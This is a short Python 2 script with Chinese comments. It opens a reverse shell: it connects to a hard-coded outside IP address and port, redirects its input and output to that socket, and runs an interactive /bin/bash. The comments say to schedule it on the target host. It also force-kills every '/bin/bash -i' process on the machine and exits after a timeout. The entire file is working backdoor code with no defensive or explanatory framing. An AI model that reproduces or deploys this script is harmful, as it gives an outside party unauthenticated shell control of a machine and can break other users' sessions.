#!/usr/bin/python
# -*- coding: utf-8 -*-
# 使用方法：在要进行远程连接的主机上定时执行

import os,socket,subprocess,time
import threading
import sys
import commands
import json
timeout=5*60
exit=False

def shell():
	global exit
	ip="122.114.14.133"
	port=38899
	try:
		s.connect((ip,port))
	except:
		print "connect [%s:%d] timeout,exit"%(ip,port) #连接超时进程自动退出，一般是没有启动服务端
		exit=True
		return
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	p=subprocess.call(['/bin/bash','-i'])
	# 正常连接后会阻塞在上面，服务端退出则停止阻塞，至此执行exit=True让主线程退出
	exit=True

def kill_all_bash():
	cmd="ps aux |grep '/bin/bash -i' |grep -v 'grep' |awk '{ print $2}'"
	command,output=commands.getstatusoutput(cmd)
	if output=="":
		return 

	process=output.split("\n")
	for item in process:
		cmd="kill -9 %s"%item.strip()
		os.system(cmd)

kill_all_bash()
socket.setdefaulttimeout(5) #设置connect超时时间为5s
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

t = threading.Thread(target=shell,args=())
t.setDaemon(True)
t.start()
count=0

#防止不明原因的进程挂起，无论是否正常连接超时后自动退出
while count<timeout:
	if exit==True:
		kill_all_bash()
		sys.exit(0)
	else:
		count=count+1
	time.sleep(1)

kill_all_bash()
sys.exit(0)
